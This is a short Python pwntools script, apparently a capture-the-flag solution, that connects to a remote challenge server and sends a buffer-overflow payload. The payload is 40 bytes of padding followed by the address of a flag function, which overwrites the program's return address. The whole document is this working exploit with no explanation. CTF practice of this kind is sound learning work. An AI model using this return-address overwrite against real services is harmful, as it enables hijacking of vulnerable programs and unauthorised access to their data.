import pwn

prog = pwn.remote('challs.actf.co', 31224)
#prog = pwn.process('wah')
flag_addr = 0x00401236
main_addr = 0x004012a3

prog.recvuntil(b':')
prog.send(32*b'A'+b'BBBBVVVV' + b'\x36\x12\x40\x00')
print(prog.recvall())
